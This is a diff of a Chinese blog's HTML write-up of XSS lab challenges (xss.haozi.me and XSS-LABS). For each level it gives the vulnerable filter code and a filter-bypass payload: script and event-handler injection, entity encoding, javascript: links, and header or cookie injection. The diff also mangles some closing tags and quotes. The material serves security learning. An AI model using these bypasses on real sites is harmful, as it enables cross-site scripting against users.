@@ -463,24 +463,24 @@
   <span class="token keyword">return</span> <span class="token string">'&lt;div>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/div>'</span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：无任何过滤。</p>
-<pre class=" language-PHP"><code class="language-PHP"><script>alert(1)</script></code></pre>
+<pre><code>&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
 <h5 id="0x01"><a href="#0x01" class="headerlink" title="#0x01"></a>#0x01</h5><pre class=" language-PHP"><code class="language-PHP">function render (input) &#123;
-  return '<textarea>' + input + '</textarea>'
+  return <textarea> + input + </textarea>
 &#125;</code></pre>
 <p>代码分析：内容生效在标签内，会无效。拼接绕过</p>
-<pre class=" language-PHP"><code class="language-PHP"></textarea><script>alert(1)</script></code></pre>
+<pre class=" language-PHP"><code class="language-PHP"></textarea><script>alert(1)<//script></code></pre>
 <h5 id="0x02"><a href="#0x02" class="headerlink" title="#0x02"></a>#0x02</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;input type="name" value="'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'">'</span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：同上关相同，拼接绕过。</p>
-<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
 <h5 id="0x03"><a href="#0x03" class="headerlink" title="#0x03"></a>#0x03</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">/</span>g
   input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> input
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：过滤了（），可以利用反引号绕过</p>
-<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre>
+<pre><code>&lt;script&gt;alert`1`&lt;//script&gt;</code></pre>
 <h5 id="0x04"><a href="#0x04" class="headerlink" title="#0x04"></a>#0x04</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span>`<span class="token punctuation">]</span><span class="token operator">/</span>g
   input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
@@ -489,14 +489,14 @@
 <p>代码分析：过滤了（）和`。利用HTML实体编码绕过。</p>
 <pre><code>&lt;img src=# onerror=alert&amp;#40;1&amp;#41;&gt;    
 &lt;svg onload=&quot;alert&amp;#40;1&amp;#41;&quot;         
-&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</code></pre>
+&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;//script&gt;</code></pre>
 <p>上面是3种方法，实体编码只在html里会生效，在JS无效。&lt;svg 会解析这个实体编码。</p>
 <h5 id="0x05"><a href="#0x05" class="headerlink" title="#0x05"></a>#0x05</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'😂'</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;!-- '</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">' -->'</span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：过滤了–&gt;,在HTML有两种注释方法–&gt;和–!&gt;。</p>
-<pre><code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<pre><code>--!&gt;&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
 <h5 id="0x06"><a href="#0x06" class="headerlink" title="#0x06"></a>#0x06</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span>auto<span class="token operator">|</span>on<span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">=</span><span class="token operator">|</span><span class="token operator">></span><span class="token operator">/</span>ig<span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> `<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">$&amp;#123;input&amp;#125;</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>`
@@ -523,10 +523,10 @@
   `
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：过滤了&lt;/style》,可以利用空格和换行绕过</p>
-<pre><code>&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
+<pre><code>&lt;/style &gt;&lt;script&gt;alert(1)&lt;//script&gt;
 
 &lt;/style
-&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+&gt;&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
 <h5 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   let domainRe <span class="token operator">=</span> <span class="token operator">/</span><span class="token operator">^</span>https<span class="token operator">?</span><span class="token punctuation">:</span>\<span class="token operator">/</span>\<span class="token operator">/</span>www\<span class="token punctuation">.</span>segmentfault\<span class="token punctuation">.</span>com<span class="token operator">/</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span>domainRe<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
@@ -535,7 +535,7 @@
   <span class="token keyword">return</span> <span class="token string">'Invalid URL'</span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：必须要含有http：//www。segmentfault.com才行</p>
-<pre><code>http://www.segmentfault.com/&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<pre><code>http://www.segmentfault.com/&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
 <h5 id="0x0A"><a href="#0x0A" class="headerlink" title="#0x0A"></a>#0x0A</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
     <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&amp;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
@@ -566,7 +566,7 @@
 <h5 id="0x0C"><a href="#0x0C" class="headerlink" title="#0x0C"></a>#0x0C</h5><pre class=" language-PHP"><code class="language-PHP">function render (input) &#123;
   input = input.replace(/script/ig, '')
   input = input.toUpperCase()
-  return '<h1>' + input + '</h1>'
+  return <h1> + input + </h1>
 &#125;</code></pre>
 <p>代码分析：就比上关多过滤个script</p>
 <pre><code>&lt;img src=&quot;#&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;h1&gt;</code></pre>
@@ -590,7 +590,7 @@ alert(1)
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：过滤了&lt;开头下个是字母的所有内容。</p>
 <p>注：ſ 被大写后就是S</p>
-<pre><code>&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;</code></pre>
+<pre><code>&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;//script&gt;</code></pre>
 <h5 id="0x0F"><a href="#0x0F" class="headerlink" title="#0x0F"></a>#0x0F</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
     <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">&amp;</span><span class="token operator">/</span>g<span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
@@ -653,9 +653,92 @@ alert(1)
   <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>代码分析：过滤”，感觉还不如上关。</p>
-<pre><code>&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<pre><code>&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
 <p>总结下吧：这个靶场很适合像作者这种刚入门XSS的菜鸟去刷刷。</p>
-
+<h3 id="XSS-LABS"><a href="#XSS-LABS" class="headerlink" title="XSS-LABS"></a>XSS-LABS</h3><h5 id="0x01-1"><a href="#0x01-1" class="headerlink" title="#0x01"></a>#0x01</h5><p>#直接上代码</p>
+<pre><code>&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
+<h5 id="0x02-1"><a href="#0x02-1" class="headerlink" title="#0x02"></a>#0x02</h5><p>代码回显的位置在标签内</p>
+<pre class=" language-php"><code class="language-php"><span class="token markup">&lt;input name=keyword  value="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>"<span class="token operator">></span></code></pre>
+<p>#利用代码</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;//script&gt;</code></pre>
+<h5 id="0x03-1"><a href="#0x03-1" class="headerlink" title="#0x03"></a>#0x03</h5><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span></code></pre>
+<p>利用函数对输入的内容进行了过滤。查看网页源代码</p>
+<pre><code>&lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt;    </code></pre>
+<p>#利用代码</p>
+<pre><code>&#39; onclick=&#39;alert(1)</code></pre>
+<h5 id="0x04-1"><a href="#0x04-1" class="headerlink" title="#0x04"></a>#0x04</h5><p>和第3一样但注意到两关闭合使用的引号不同这关是”。</p>
+<p>#代码利用</p>
+<pre><code>&quot; onclick=&quot;alert(1)</code></pre>
+<h5 id="0x05-1"><a href="#0x05-1" class="headerlink" title="#0x05"></a>#0x05</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>过滤了on和&lt;script</p>
+<p>#代码利用</p>
+<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
+<h5 id="0x06-1"><a href="#0x06-1" class="headerlink" title="#0x06"></a>#0x06</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>过滤了更多，大小写混合绕过</p>
+<p>#代码利用</p>
+<pre><code>&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
+<h5 id="0x07-1"><a href="#0x07-1" class="headerlink" title="#0x07"></a>#0x07</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>这关是替换成空，代码叠加绕过</p>
+<p>#代码利用</p>
+<pre><code>&quot;&gt;&lt;a hrhrefef=&quot;javascscriptript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
+<h5 id="0x08-1"><a href="#0x08-1" class="headerlink" title="#0x08"></a>#0x08</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span></code></pre>
+<p>可以利用HTML实体编码绕过，&amp;#82；代表R</p>
+<p>#代码利用</p>
+<pre><code>javasc&amp;#82;ipt:alert(&#39;http://xss&#39;)</code></pre>
+<h5 id="0x09-1"><a href="#0x09-1" class="headerlink" title="#0x09"></a>#0x09</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token keyword">else</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
+<p>多了判读语句，必须要含有http：//才行</p>
+<p>#代码利用</p>
+<pre><code>javasc&amp;#82;ipt:alert(&#39;http://xss&#39;)</code></pre>
+<h5 id="0x0A-1"><a href="#0x0A-1" class="headerlink" title="#0x0A"></a>#0x0A</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre>
+<p>这里回显的是t_sort，所以需要直接构造</p>
+<p>#代码利用</p>
+<pre><code>&amp;t_sort=click me!&quot; type=&quot;button&quot; onclick=&quot;alert(1)</code></pre>
+<h5 id="0x0B-1"><a href="#0x0B-1" class="headerlink" title="#0x0B"></a>#0x0B</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>回显的内容是http请求包的referer部分，用burp截包修改referer部分</p>
+<p>#代码利用</p>
+<pre><code>referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
+<h5 id="0x0C-1"><a href="#0x0C-1" class="headerlink" title="#0x0C"></a>#0x0C</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
+<p>修改User-Agent</p>
+<p>#代码利用</p>
+<pre><code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
+<h5 id="0x0D-1"><a href="#0x0D-1" class="headerlink" title="#0x0D"></a>#0x0D</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
+<p>修改Cookie</p>
+<p>#代码利用</p>
+<pre><code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
+<h5 id="0x0E"><a href="#0x0E" class="headerlink" title="#0x0E"></a>#0x0E</h5><p>不能进行测试</p>
+<h5 id="0x0F-1"><a href="#0x0F-1" class="headerlink" title="#0x0F"></a>#0x0F</h5>
             </div>
             <hr/>
 
